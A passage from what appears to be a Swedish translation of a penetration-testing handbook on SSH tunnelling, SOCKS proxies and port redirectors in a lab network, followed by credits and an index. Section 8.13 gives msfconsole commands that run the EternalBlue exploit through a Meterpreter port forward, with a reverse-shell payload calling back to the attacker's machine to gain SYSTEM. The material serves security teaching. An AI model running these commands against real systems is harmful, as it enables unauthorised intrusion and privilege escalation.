ssh -p 22 nemo@192.168.1.220 -D 9050
```

Från KALI, utnyttja den nya proxyn för att skanna scanme.nmap.org (45.33.32.156):
```bash
proxychains nmap 45.33.32.156 -sV -sT -p 22,80,443,8080
```

### 7.8 Wfuzz-webbkatalog bruteforce
Wfuzz är ett utmärkt verktyg för att bruteforca gömda webbkataloger och finns förinstallerat på Kali. Ibland när man använder Wfuzz vill man dölja sin sanna käll-IP eller man har komprometterat en värd och vill skanna genom den. Det betyder att vi antingen kan utnyttja en SOCKS-proxy eller en SSH-lokal portvidarebefordring. Det här avsnittet är menat att demonstrera de alternativ och flexibilitet du har beroende på situationen. Wfuzz stöder användning av en proxy med `-p [ip:port:typ]`-växeln.

Låt oss se de olika alternativen baserat på om en dynamisk SOCKS-proxy eller SSH-lokal portvidarebefordring används när man skannar en webbplats som värds på TARGET1 från en "komprometterad" JUMPBOX1.

SSH:a in i JUMPBOX1 och konfigurera både en lokal portvidarebefordring och dynamisk SOCKS-proxy:
```bash
ssh -p 22 nemo@192.168.1.220 -D 9050 -L 8000:192.168.1.230:80
```

Låt oss köra wfuzz genom båda tunnlarna. Först upp är den dynamiska SOCKS-proxyn med Wfuzz inbyggda proxystöd:
```bash
wfuzz -c --hc 404 -z file,/usr/share/dirb/wordlists/big.txt \
  -p 127.0.0.1:9050:SOCKS5 http://192.168.1.230/FUZZ
```

Nu låt oss se hur man utnyttjar SSH-lokal portvidarebefordring:
```bash
wfuzz -c --hc 404 -z file,/usr/share/dirb/wordlists/big.txt \
  http://127.0.0.1:8000/FUZZ
```

De var ungefär lika snabba när det gäller förfrågningar/sek, men den här testen gjordes på ett lokalt nätverk. I verkligheten kan du ha nätverkslatens eller undermäktig prestanda på komprometterad värd, så det kan vara snabbare att använda den raka SSH-lokala portvidarebefordringen istället för SOCKS-proxyn. Kom bara ihåg att ditt miljö kan variera och att du har alternativ.

---

## 8. Avancerade ämnen

### 8.1 The Cyber Plumber's Lab Guide and Interactive Access
Påminnelse: Köp labbguiden på https://opsdisk.gumroad.com/l/cphlab

### 8.2 Översikt
Det här kapitlet är dedikerat till olika verktyg och tekniker som kan användas för att uppnå liknande mål som SSH:s `-L`, `-R` och `-D`-växlar. Dessutom ska vi utforska hur du kan dela portvidarebefordringar, utnyttja Metasploit-moduler och eskalera dina privilegier lokalt med ett fjärrexploit.

### 8.3 Linux-omdirigerare - redir
redir är en "TCP-portomdirigerare för UNIX" (https://github.com/troglobit/redir) som kan installeras med apt. Det är enbart en portomdirigerare och krypterar inte trafiken som en SSH-tunnel gör. Du kanske måste lägga till "universe" i din `/etc/apt/sources.lst` om det inte dyker upp.
```bash
add-apt-repository universe
apt install redir -y
```

Låt oss titta på växlarna med `redir -h`:
- `-l` - Lyssna port
- `-c` - Anslut port
- `-a` - Lyssna adress
- `-b` - Anslut adress

Låt oss konfigurera det för att omdirigera trafik från TCP 28421 på JUMPBOX1s ens33-gränssnitt till TCP 22 på TARGET1s ens33-gränssnitt. Observera att portomdirigering bara sker så länge binären körs.

Vad om vi vill ha något mer permanent som kan köra som en tjänst?

### 8.4 Linux-omdirigerare - rinetd
rinetd är en "Internet TCP-omdirigeringsserver" som kan installeras med apt. Du kanske måste lägga till "universe" i din `/etc/apt/sources.lst` om det inte dyker upp. Mer information finns här https://packages.ubuntu.com/source/bionic/rinetd
```bash
add-apt-repository universe
apt install rinetd -y
```

Låt oss kolla in konfigurationsfilen här: `/etc/rinetd.conf`. Detta ser ganska rakt framåt ut. Låt oss konfigurera det för att omdirigera trafik från TCP 28421 på JUMPBOX1s ens33-gränssnitt till TCP 22 på TARGET1s ens33-gränssnitt. När konfigurationsfilen är uppdaterad, starta om rinetd-tjänsten och verifiera att den körs:
```bash
systemctl restart rinetd
netstat -natp | egrep LIST
```

Jag överlåter det åt dig att utnyttja det med olika verktyg. Den stora skillnaden mellan detta och en SSH-tunnel är att rinte inte krypterar trafiken, den omdirigerar den bara. Hoppas du börjar se att när du har grunderna ner, är de flesta av dessa verktyg och koncept desamma.

### 8.5 Windows-omdirigerare - netsh
Visste du att Windows kommer med en inbyggd TCP-portomdirigerare i binären `netsh.exe`? Låt oss utforska några av alternativen för att utnyttja detta. Funktionen kallas "portproxy" och kan bara skapas från ett förhöjt administratörsskal. Låt oss demonstrera hur vi kan konfigurera en för att proxya vår trafik till github.com. Det är sant, den kan hantera DNS-uppslag också!

```cmd
# Visa aktuella portproxys.
netsh interface portproxy show all

# Skapa portproxyn.
netsh interface portproxy set v4tov4 listenport=3127 \
  connectaddress=github.com connectport=443 protocol=tcp

# Visa aktuella portproxys.
netsh interface portproxy show all

# Verifiera att den lyssnar.
netstat -nato | findstr 3127
tasklist | findstr <PID från netstat>

# Visa portproxy i registret.
reg query hklm\system\currentcontrolset\services\portproxy /s
```

Att radera portproxys är rakt framåt:
```cmd
# Radera portproxyn.
netsh interface portproxy delete v4tov4 listenport=3127 protocol=tcp

# Visa aktuella portproxys.
netsh interface portproxy show all
```

Du kommer att märka att den lyssnar på 0.0.0.0:3127, vilket betyder alla gränssnitt. Om en brandväggsregel lades till för att tillåta inkommande till TCP 3127, kunde andra datorer utnyttja det också. Om du ville låsa det till endast lokal trafik, skulle du specificera `listenaddress=127.0.0.1`. Observera också att processen kopplad till lyssnande port är `svchost.exe`.

För nätverksförsvarsare, detta är definitivt en registernyckel att övervaka noggrant för, eftersom, även om det finns legitima användningar för en portproxy, kan den användas för att omdirigera trafik ut ur ditt nätverk. Komprometterade boxar med beaconing-implanteringar skulle ringa tillbaka till en DMZ-box (som har både en intern och extern IP) på en enda box, som sedan skulle omdirigera trafiken ut ur ditt nätverk till en lyssnare. Som en påminnelse, lagras dessa portomdirigeringar i registret:
```cmd
reg query hklm\system\currentcontrolset\services\portproxy /s
```

### 8.6 netsh + Meterpreter = <3
Meterpreter-payloaden har till och med en modul för att hantera Windows netsh-portvidarebefordringar åt dig! Du hittar mer information här https://www.rapid7.com/db/modules/post/windows/manage/portproxy. Den tar till och med hand om att öppna porten på värdens brandvägg. För den här modulen måste du vara minst administratör.

### 8.7 Windows-omdirigerare - fpipe
Fpipe är en icke-inbyggd binär som är en "källportsvidarebefordrare/omdirigerare. Den kan skapa en TCP- eller UDP-ström med en källport efter ditt val". Du kan fortfarande hitta det på McAfees australiska webbplats för nedladdning (http://www.foundstone.com.au/de/downloads/free-tools/fpipe.aspx).

Växlarna är självförklarande och liknar andra verktyg vi har utforskat.

### 8.8 Windows-omdirigerare - winrelay
Ett annat icke-inbyggt alternativ är WinRelay. Rakt från webbplatsen, "WinRelay är en TCP/UDP-vidarebefordrare/omdirigerare som fungerar med både IPv4 och IPv6. Du kan välja port och IP den ska lyssna på, källport och IP som den ska ansluta från, och port och IP som den ska ansluta till." (http://www.ntsecurity.nu/toolbox/winrelay/).

Exempel:
```cmd
winrelay.exe -lip 127.0.0.1 -lp 4444 -dip 54.241.2.241 -dp 443 -proto tcp
```

### 8.9 Shadowsocks - En SSH -D-alternativ
Shadowsocks är SOCKS5-programvara som används i en klient/server-konfiguration för att upprätta en SOCKS-proxy mellan en klient och server. Tänk på det som `-D` för SSH, men utan att behöva SSH:a in i boxar för att konfigurera SOCKS-proxyn. Låt oss gå igenom hur man konfigurerar det. Shadowsocks måste installeras på både KALI (klient) och JUMPBOX1 (server):
```bash
apt install shadowsocks-libev -y
```

Redigera `/etc/shadowsocks-libev/config.json` på både klienten och servern så att lösenorden är desamma. Se till att klient- och serverkonfigurationerna är desamma.

Efter installationen kan shadowsocks-libev-tjänsten starta automatiskt. För nu, stoppa den bara:
```bash
systemctl status shadowsocks-libev
systemctl stop shadowsocks-libev
systemctl status shadowsocks-libev
```

På JUMPBOX1, starta servern med `ss-server`-binären och specificerad konfigurationsfil:
```bash
ss-server -c /etc/shadowsocks-libev/config.json
```

På KALI, anslut till servern med klienten `ss-local`-binär och specificerad konfigurationsfil:
```bash
ss-local -c /etc/shadowsocks-libev/config.json
```

Låt oss kolla nätverksanslutningarna på klienten. Kom ihåg, Shadowsocks ersätter vår SSH-anslutning och `-D`-alternativet, så titta på klientkonfigurationen igen och se om du kan avgöra vilket gränssnitt och port som kommer att lyssna på klienten.

Vid den här punkten kan vi utnyttja proxychains för att dra nytta av SOCKS5-proxyn som upprättats av Shadowsocks för att RDP:a in i TARGET2. Se till att uppdatera `/etc/proxychains.conf`-filen med den nya SOCKS-typen (socks5) och lyssnande port (1080).

### 8.10 Dela portvidarebefordringar och SOCKS-proxys
Genom hela den här boken hittills har all trafik känts från KALI-boxen genom att ha SSH-lokala portvidarebefordringar (`-L`) eller SOCKS-proxys lyssnande på KALIs 127.0.0.1-gränssnitt endast. Detta säkerställer att bara trafik från KALI tillåts att utnyttja och använda tunnlarna. Vad händer om du är i ett penetrationstest-engagemang och vill dela en tunnel med lagkamrater? Kanske du har ett skal på en box, och medan du undersöker boxen, konfigurerar du en tunnel så en lagkamrat kan börja skanna genom den komprometterade värden. När du konfigurerar tunnlar, är den enda skillnaden att specificera det lokala lyssnande gränssnittet. Så istället för att specificera 127.0.0.1, skulle du specificera eth0 (som fortfarande är konventionen i KALI).

För en SSH-lokal portvidarebefordring skulle det se ut så här:
```bash
# Endast tillåt trafik från 127.0.0.1 att utnyttja tunneln.
ssh -p 22 nemo@192.168.1.220 -L 127.0.0.1:2000:192.168.1.230:22

# Tillåt all trafik som träffar eth0-gränssnittet att utnyttja tunneln.
ssh -p 22 nemo@192.168.1.220 -L 192.168.1.200:2000:192.168.1.230:22
```

För en dynamisk SOCKS-proxy skulle det se ut så här:
```bash
# Endast tillåt trafik från 127.0.0.1 att utnyttja tunneln.
ssh -p 22 nemo@192.168.1.220 -D 127.0.0.1:9050

# Tillåt all trafik som träffar eth0-gränssnittet att utnyttja tunneln.
ssh -p 22 nemo@192.168.1.220 -D 192.168.1.200:9050
```

Din lagkamrat skulle då uppdatera sin `/etc/proxychains.conf`-fil för att peka på din KALIs eth0-gränssnitt.

### 8.11 Meterpreter portfwd-modul
Meterpreter-payloaden erbjuder en snygg portvidarebefordringskapacitet. När du upprättar en anslutning med en Meterpreter-payload kan du omedelbart börja konfigurera lokala och fjärrportvidarebefordringar. Låt oss ta en snabb titt på alternativen och formatet:
```
portfwd -h
```

Ser bekant ut, va? Är du inte glad att du har ssh `-L` / `-R`-grunderna ner? Låt oss säga att du har ett Meterpreter-skal på Windows TARGET2-boxen. Du gör lite snabb nätverksrekon genom att köra `ifconfig` och `route` Meterpreter-kommandon och ser att den är dual-NIC:ad med ett 192.168.1.240-gränssnitt och ett 172.16.1.240-gränssnitt.

Låt oss utnyttja Meterpreters portfwd-modul för att skapa en SSH `-L`-ekvivalent portvidarebefordring för att SSH:a in i TARGET3 (172.16.1.250):
```msfconsole
portfwd add -L 127.0.0.1 -l 2323 -r 172.16.1.250 -p 22
```

Slutligen, SSH:a in i TARGET3, specificerar rätt port och värd.

Vad om vi ville ha något mer robust för att ansluta till TARGET3, där vi inte behövde specificera varje portvidarebefordring?

### 8.12 Metasploit SOCKS-proxys
Metasploit levereras med SOCKS4a- och SOCKS5-proxymoduler som kan kombineras med proxychains och Meterpreter för att ansluta till enheter djupt i ett nätverk. I föregående avsnitt visste vi att TARGET2 var dual-NIC:ad och det fanns ett 172.16.1.0-nätverk också kopplat. Låt oss backgrounda den Meterpreter-sessionen, och lägg till den vägen så att vår KALIs Metasploit vet om det. Se till att Meterpreter-sessionsnumret (2 i det här fallet) matchar:
```msfconsole
background
route print
route add 172.16.1.0 255.255.255.0 2
route print
```

Starta Metasploits inbyggda SOCKS4a-proxyserver. Konfigurera SRVHOST om du vill låsa det till endast lokal KALI-trafik eller sätt det till din eth0 om du vill att lagkamrater ska utnyttja det:
```msfconsole
use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
set SRVPORT 9050
show options
run
jobs
```

Om du kör netstat på KALI kommer du att se gränssnittet och porten lyssnar som ruby-processen, som kör Metasploit-ramverket.

Låt oss skanna boxen för att se vilka portar som kan vara öppna genom att para proxychains med en nmap full connect (`-sT`) skanning. Se till att din `/etc/proxychains.conf` är uppdaterad med våra proxyinställningar (socks4 127.0.0.1 9050). Observera att inaktivera värdidentifiering (`-Pn`) eftersom pingar och ICMP inte kan utnyttja SOCKS4a-proxyn. I det här fallet används SOCKS4a Metasploit-servern, så du måste inaktivera DNS-upplösning också (`-n`). Om du använder SOCKS5 auxiliary/server/socks5-servern kan du aktivera DNS-upplösning eftersom SOCKS5 kan hantera det:
```bash
proxychains nmap -p 22,80,443 --open -sT -sV -n -Pn 172.16.1.250
```

Det ser ut som att SSH är öppet. Det sista steget är att SSH:a in i TARGET3 med proxychains:
```bash
proxychains ssh -p 22 nemo@172.16.1.250
```

Sött! Du har nu en SSH-anslutning från KALI, genom TARGET2 (Windows) till TARGET3 (Linux). Titta på nätverksanslutningarna från den dual-NIC:ade Windows TARGET2-perspektivet.

Vid den här punkten har du kombinerat proxychains, Meterpreter-payloaden och Metasploits route och SOCKS4a-server för att nå ett nätverk som inte är tillgängligt från KALI-boxen. Detta var möjligt även om Meterpreter-payloaden som kördes på TARGET2 kördes som "bob"-användaren och inte som administratör eller SYSTEM. Vad om du ville få SYSTEM på TARGET2 med hjälp av koncepten och verktygen från den här boken?

### 8.13 Privilegieeskalering
Har du någonsin hört en administratör säga:
> Vi behöver inte patcha denna Windows-box för SMB-sårbarheter för att vi har en brandvägg som blockerar inkommande TCP 139/445? Även om en angripare skulle kompromettera webbservern, skulle de bara köra som en oprivilegierad användare.

Låt oss gå igenom ett scenario som ska skena lite ljus på varför detta är falskt. Säg att du kan kompromettera en Microsoft Windows 2008 x64-server (TARGET2) och uppnå fjärrkodkörning med en Meterpreter-payload som körs som en oprivilegierad användare. Den initiala exploiteringsvektorn är irrelevant för syftet med den här genomgången. Genom att göra lite situationell medvetenhet och rekon, verkar det som att du kör som den oprivilegierade användaren "bob".

Hur kan du höja dina privilegier till SYSTEM? Det finns inga uppenbara eskalationsattacker, men du ger inte upp. Du undrar boxen lite mer och inser att den inte har patchats på länge och saknar KB4012598-patchen för MS17-010 ETERNALBLUE-exploiten (http://www.catalog.update.microsoft.com/ScopedViewInline.aspx?updateid=5680ca8f-be92-4d13-8e4e-587aa462e838).

Du vet redan att det finns en Metasploit-modul för detta exploit, men du funderar "var det inte en fjärrkodkörningsexploit?" Du försöker bara hitta en lokal privilegieeskalationsattackvektor. Du kollar nätverksanslutningarna och ser att SMB lyssnar på TCP 445, så det måste finnas en brandväggsenhet framför boxen, eller till och med en värdbaserad brandvägg, som blockerar inkommande anslutningar till TCP 445.

Om det bara fanns ett sätt att utnyttja vår befintliga kunskap om portvidarebefordring och omdirigering för att få SYSTEM på denna box. Hur kan du utnyttja en "fjärr"-kodkörningsexploit lokalt för att höja dina privilegier? Om du vill stanna och försöka lista ut det själv, är nu din chans... annars, låt oss gräva ner i attacken.

Kom ihåg Meterpreters portfwd-kommando? Låt oss utnyttja det för att se om vi kan komma åt TCP 445-trafik på TARGET2. Som en påminnelse, kommer trafiken inte från din KALI-box (som blockeras ändå), utan från TARGET2 självt, så den är betrodd. I vår husanalogi, är vi redan inne i huset! Konfigurera portfwd för att lyssna på TCP 4450 på KALIs 127.0.0.1-gränssnitt och omdirigera trafiken till TCP 445 på TARGET2s 127.0.0.1-gränssnitt. Konfigurera också den lokala portvidarebefordringen för RPC-arkitekturfrågan. Se kapitel 3 om du behöver en uppdatering på RPC-arkitekturfrågan.
```msfconsole
portfwd add -L 127.0.0.1 -l 4450 -r 127.0.0.1 -p 445
portfwd add -L 127.0.0.1 -l 135 -r 127.0.0.1 -p 135
```

Använd nmap för att säkerställa att portarna vidarebefordras korrekt:
```bash
nmap -p 135,4450 -sV -sT -Pn -n --open 127.0.0.1
```

Vid den här punkten är det som om TARGET2 inte har en brandvägg som blockerar externt tillgång till TCP 445. Så låt oss bara behandla detta som ett normalt fjärrexploit, bara lite modifiera våra RHOST och RPORT-variabler för att utnyttja portfwd-portomdirigeringen.

Konfigurera exploitet för att bara ringa tillbaka till KALI-boxen. Syftet med det här avsnittet är bara att demonstrera privilegieeskalering med ett fjärrexploit när du redan har ett lågt privilegierat skal. Visst, du bör veta hur du använder en `-R` och en annan box för att fånga återanropet och tunnla det tillbaka till KALI.
```msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 127.0.0.1
set RPORT 4450
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 443
set DisablePayloadHandler true
```

I en separat msfconsole-instans, konfigurera din Meterpreter-hanterare. Eller, om du vet vad du gör, återanvänd den som har det låga privilegie Meterpreter-skalet.
```msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 443
exploit
```

Vid den här punkten ska du kunna kasta exploitet och, med lite tur, få ett SYSTEM-nivå skal! Med detta exploit kan det ta ett par försök att framgångsrikt få kodkörning. Sessionerna nedan visar den ursprungliga, låga privilegierade "bob" Meterpreter-sessionen och den nya SYSTEM Meterpreter-sessionen.

Observera att Metasploit Framework version 5 användes för den här demonstrationen (identifierat av "msf5"-kommandoprompten). Det fanns en bugg (fixad i https://github.com/rapid7/metasploit-framework/pull/10699) i tidigare versioner som hindrade detta från att fungera korrekt.

I det här scenariot kunde du utnyttja din kunskap om portomdirigering och tunnling för att kasta ett "fjärr"-exploit lokalt, för att eskalera privilegier till SYSTEM... ganska coolt! Så nästa gång du har en administratör som säger något som citatet ovan, kan du tryggt förklara varför det helt enkelt inte är sant.

Det finns även andra sätt att attackera tjänster (inte nödvändigtvis i syfte att eskalera privilegier) som körs på 127.0.0.1 eller bara litar på trafik från 127.0.0.1. Se dessa exempel för mer inspiration. Det första är "Exploiting Privilege Escalation in Serv-U by SolarWinds" (se https://www.trustwave.com/Resources/SpiderLabs-Blog/Exploiting-Privilege-Escalation-in-Serv-U-by-SolarWinds) och det andra är Metasploits "CUPS Filter Bash Environment Variable Code Injection (Shellshock)" modul `exploit/multi/http/cups_bash_env_exec`.

---

## 9. Krediter

### 9.1 Bomslagsgrafik
Bomslaget och https://cph.opsdisk.com grafik designades av den otroligt talangfulla "vonholdt". Du hittar honom på https://vonholdt.wordpress.com eller besök hans Etsy-butik på https://www.etsy.com/shop/vonholdt/

### 9.2 LaTeX-mall
Den här boken skapades med Legrand Orange Book LaTeX-mall, Version 2.3 (8/8/17), som kan laddas ner från: http://www.LaTeXTemplates.com. Originalförfattaren är Mathias Legrand (legrand.mathias@gmail.com) med modifieringar av Vel (vel@latextemplates.com). Se https://latex.org/forum/viewtopic.php?t=25684 för mer licensinformation.

### 9.3 Kapitelfoton
Alla kapitelsbilder finns här:
- Kapitel 1 - https://pixabay.com/en/pipe-taps-plumbing-water-valve-1821109/
- Kapitel 2 - https://pixabay.com/en/lost-places-factory-old-abandoned-1798640/
- Kapitel 3 - https://pixabay.com/en/plumbing-plumber-pipe-galvanized-1433606/
- Kapitel 4 - https://pixabay.com/en/water-pipe-wall-pipe-brick-518030/
- Kapitel 5 - https://pixabay.com/en/lost-places-factory-old-abandoned-2178884/
- Kapitel 6 - https://pixabay.com/en/pipe-hydroelectric-power-station-huanza-1264066/
- Kapitel 7 - https://pixabay.com/en/water-pipe-plumbing-pipeline-2852047/
- Kapitel 8 - https://pixabay.com/en/ladybower-reservoir-3130007/
- Innehåll, Krediter, Index - https://pixabay.com/en/wheel-valve-heating-line-turn2137043/

### 9.4 Ändringslogg
Det här avsnittet spår tillägg, ändringar och borttagningar med varje version.
- **Version 1.0** (publicerad 5 oktober 2018) - Initial publicering
- **Version 1.1** (publicerad 9 februari 2019) - Uppdaterad URL för "Försvarsmän tänker i listor. Angripare tänker i grafer..." i "Målgrupp"-avsnittet; förtydligade "Gratis för studenter"-avsnittet; lade till ssh `-J` ProxyJump-information i "SSH-tunnlar, i tunnlar, i tunnlar"-avsnittet; tog bort Metasploit-buggfråga i "Privilegieeskalering"-avsnittet eftersom den nu är stabil i Metasploit Framework version 5.
- **Version 1.2** (publicerad 20 februari 2019) - Uppdaterat ssh-kommando för att reflektera TARGET1s destinationsport från 22 till 2222 i "Översikt"-avsnittet i "SSH -L Portvidarebefordring till fjärrmål".
- **Version 1.3** (publicerad 22 maj 2019) - Fixade ssh-rad i avsnitt 5.3 för att utnyttja `-R` istället för `-L` eftersom det är en omvänd portvidarebefordring.
- **Version 1.4** (publicerad 29 augusti 2021) - Lade till "The Cyber Plumber's Lab Guide and Interactive Access"-påminnelseavsnitt till varje kapitel, tog bort "Gratis för studenter"-avsnitt, uppdaterade Scantron-diagram och komponentnamn, och fixade generell formatering.

---

## Index
- **Ändringslogg**, 80
- **Kapitelfoton**, 79
- **Chrome**, 52
- **Kommandöversikt**, 12
- **Ansluta rör**, 7
- **curl**, 53
- **Exploit-återanrop med -R**, 43
- **Firefox**, 52
- **Första anslutning**, 17, 35
- **Ghost Blog Admin Panel**, 21
- **Gophish Admin Panel**, 19
- **Husanalogin**, 14
- **Installera proxychains**, 49
- **Målgrupp**, 7
- **LaTeX-mall**, 79
- **Linux BASH-alias**, 9
- **Linux-omdirigerare - redir**, 57
- **Linux-omdirigerare - rinetd**, 58
- **Linux-serverkonvention**, 9
- **Metasploit SOCKS-proxys**, 69
- **Meterpreter portfwd-modul**, 67
- **Netcat**, 13
- **Netcat-chatt**, 18, 24, 36, 42, 50
- **Netcat-skal**, 19
- **netsh + Meterpreter = <3**, 61
- **Nätverksgränssnittskort**, 14
- **Nätverksgrunder**, 14
- **nmap**, 14
- **nmap-skanning**, 54
- **Översikt**, 17, 23, 35, 41, 49, 57
- **Privilegieeskalering**, 73
- **proxychains**, 14
- **Fjärrskrivbordsprotokoll genom hoppbox**, 28
- **Krav**, 9
- **Scantron-motortunnlar**, 37
- **Shadowsocks - En SSH -D-alternativ**, 64
- **Dela portvidarebefordringar och SOCKS-proxys**, 66
- **SSH-klient**, 12
- **SSH-server**, 12
- **SSH till Linux-mål**, 25
- **SSH-tunnlar, i tunnlar, i tunnlar**, 25
- **The Cyber Plumber's Lab Guide and Interactive Access**, 9, 17, 23, 35, 41, 49, 57
- **Kasta exploit**, 31
- **Webbläsning**, 29, 51
- **Wfuzz-webbkatalog bruteforce**, 55
- **Windows DOS-makron (aka Windows-alias)**, 10
- **Windows-omdirigerare - fpipe**, 62
- **Windows-omdirigerare - netsh**, 59
- **Windows-omdirigerare - winrelay**, 63
- **WWW-server till 127.0.0.1**, 42